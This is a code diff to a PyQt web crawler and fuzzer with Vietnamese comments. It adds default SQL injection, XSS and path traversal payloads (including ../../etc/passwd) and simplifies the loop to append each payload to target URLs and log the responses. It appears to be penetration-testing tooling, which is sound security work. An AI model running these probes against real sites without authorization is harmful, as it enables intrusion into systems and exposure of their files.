@@ -109,9 +109,18 @@ class CrawlerFuzzerApp(QWidget):
         self.payload_input.setPlaceholderText("Nhập payload mỗi dòng (hoặc để trống dùng mặc định)")
         default_payloads = [
             "' OR '1'='1-- ",
+            "' OR '1'='1 ",
+            "OR '1'='1 ",
+            " OR 1=1 ",
+            " OR 1=1--",
+            "?name=<script>alert(1)</script>",
+            "<script>alert(1)</script>",
             "><script>alert(1)</script>",
+            "<img src=x onerror=alert('XSS')>",
             "../../../../etc/passwd",
             "../../../../etc/hostname",
+            "../../../../../../hsnh/kqtrma.php",
+            "../../../../../../../../log.txt",
             "action=delete",
         ]
         self.payload_input.setPlainText('\n'.join(default_payloads))
@@ -229,7 +238,6 @@ class CrawlerFuzzerApp(QWidget):
         def worker():
             options = Options()
             options.add_argument('--headless')
-            options.add_argument('--disable-gpu')
             options.add_argument('--no-sandbox')
             driver = webdriver.Chrome(options=options)
             while not cancelled.is_set():
@@ -292,31 +300,39 @@ class CrawlerFuzzerApp(QWidget):
         else:
             QMessageBox.information(self, "Không tìm thấy", "Không có URL nào có tham số để fuzz.")
 
+# Hàm start_fuzzing thực hiện fuzzing URL với các payload
     def start_fuzzing(self):
+    # Lấy danh sách URL từ giao diện người dùng
+   # Lấy danh sách URL từ giao diện người dùng
         fuzz_urls = [u.strip() for u in self.urls_to_fuzz_text.toPlainText().splitlines() if u.strip()]
         if not fuzz_urls:
             QMessageBox.warning(self, "Lỗi", "Vui lòng nhập ít nhất 1 URL để fuzz.")
             return
 
-        payloads = [p.strip() for p in self.payload_input.toPlainText().splitlines() if p.strip()]
+# Lấy danh sách payload
+        payloads = [p for p in self.payload_input.toPlainText().splitlines() if p.strip()]
         if not payloads:
             payloads = [
             "' OR '1'='1-- ",
+            "' OR '1'='1 ",
+            "OR '1'='1 ",
+            " OR 1=1 ",
+            " OR 1=1--",
+            "?name=<script>alert(1)</script>",
+            "<script>alert(1)</script>",
             "><script>alert(1)</script>",
+            "<img src=x onerror=alert('XSS')>",
             "../../../../etc/passwd",
             "../../../../etc/hostname",
+            "../../../../../../hsnh/kqtrma.php",
+            "../../../../../../../../log.txt",
             "action=delete",
             ]
 
-        total = 0
-        for url_to_fuzz in fuzz_urls:
-            parsed = urlsplit(url_to_fuzz)
-            if parsed.query:
-                params = parse_qs(parsed.query)
-                total += len(params) * len(payloads)
-            else:
-                total += len(payloads)
+# Tính tổng số yêu cầu (mỗi URL nhân với số payload)
+        total = len(fuzz_urls) * len(payloads)
 
+# Tạo thanh tiến trình
         progress = QProgressDialog("Đang fuzzing...", "Hủy", 0, total, self)
         progress.setWindowModality(Qt.WindowModal)
         progress.setMinimumDuration(0)
@@ -324,67 +340,35 @@ class CrawlerFuzzerApp(QWidget):
 
         self.result_table.setRowCount(0)
         count = 0
+
+# Duyệt qua từng URL và payload
         for url_to_fuzz in fuzz_urls:
-            parsed = urlsplit(url_to_fuzz)
-            if parsed.query:
-                query_dict = parse_qs(parsed.query)
-                for param in query_dict:
-                    for payload in payloads:
-                        if progress.wasCanceled():
-                            break
-                        new_params = query_dict.copy()
-                        new_params[param] = payload
-                        fuzzed_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path,
-                                              urlencode(new_params, doseq=True), parsed.fragment))
-                        try:
-                            start_time = time.time()
-                            r = requests.get(fuzzed_url, timeout=5)
-                            duration = round(time.time() - start_time, 3)
-                            content = r.text
-                            byte_len = len(content.encode())
-                            word_count = len(content.split())
-                            line_count = len(content.splitlines())
+            for payload in payloads:
+                if progress.wasCanceled():
+                    break
+                fuzzed_url = f"{url_to_fuzz}{payload}"
+                try:
+                    start_time = time.time()
+                    r = requests.get(fuzzed_url, timeout=5)
+                    duration = round(time.time() - start_time, 3)
+                    content = r.text
+                    byte_len = len(content.encode())
+                    word_count = len(content.split())
+                    line_count = len(content.splitlines())
 
-                            row = self.result_table.rowCount()
-                            self.result_table.insertRow(row)
-                            self.result_table.setItem(row, 0, QTableWidgetItem(payload))
-                            self.result_table.setItem(row, 1, QTableWidgetItem(fuzzed_url))
-                            self.result_table.setItem(row, 2, QTableWidgetItem(str(r.status_code)))
-                            self.result_table.setItem(row, 3, QTableWidgetItem(str(byte_len)))
-                            self.result_table.setItem(row, 4, QTableWidgetItem(str(word_count)))
-                            self.result_table.setItem(row, 5, QTableWidgetItem(str(line_count)))
-                            self.result_table.setItem(row, 6, QTableWidgetItem(str(duration)))
-                        except:
-                            pass
-                        count += 1
-                        progress.setValue(count)
-            else:
-                for payload in payloads:
-                    if progress.wasCanceled():
-                        break
-                    fuzzed_url = f"{url_to_fuzz}{payload}"
-                    try:
-                        start_time = time.time()
-                        r = requests.get(fuzzed_url, timeout=5)
-                        duration = round(time.time() - start_time, 3)
-                        content = r.text
-                        byte_len = len(content.encode())
-                        word_count = len(content.split())
-                        line_count = len(content.splitlines())
-
-                        row = self.result_table.rowCount()
-                        self.result_table.insertRow(row)
-                        self.result_table.setItem(row, 0, QTableWidgetItem(payload))
-                        self.result_table.setItem(row, 1, QTableWidgetItem(fuzzed_url))
-                        self.result_table.setItem(row, 2, QTableWidgetItem(str(r.status_code)))
-                        self.result_table.setItem(row, 3, QTableWidgetItem(str(byte_len)))
-                        self.result_table.setItem(row, 4, QTableWidgetItem(str(word_count)))
-                        self.result_table.setItem(row, 5, QTableWidgetItem(str(line_count)))
-                        self.result_table.setItem(row, 6, QTableWidgetItem(str(duration)))
-                    except:
-                        pass
-                    count += 1
-                    progress.setValue(count)
+                    row = self.result_table.rowCount()
+                    self.result_table.insertRow(row)
+                    self.result_table.setItem(row, 0, QTableWidgetItem(payload))
+                    self.result_table.setItem(row, 1, QTableWidgetItem(fuzzed_url))
+                    self.result_table.setItem(row, 2, QTableWidgetItem(str(r.status_code)))
+                    self.result_table.setItem(row, 3, QTableWidgetItem(str(byte_len)))
+                    self.result_table.setItem(row, 4, QTableWidgetItem(str(word_count)))
+                    self.result_table.setItem(row, 5, QTableWidgetItem(str(line_count)))
+                    self.result_table.setItem(row, 6, QTableWidgetItem(str(duration)))
+                except:
+                    pass
+                count += 1
+                progress.setValue(count)
 
         progress.cancel()
         self.status_label.setText(f"Fuzz hoàn thành: {count}/{total} tác vụ")
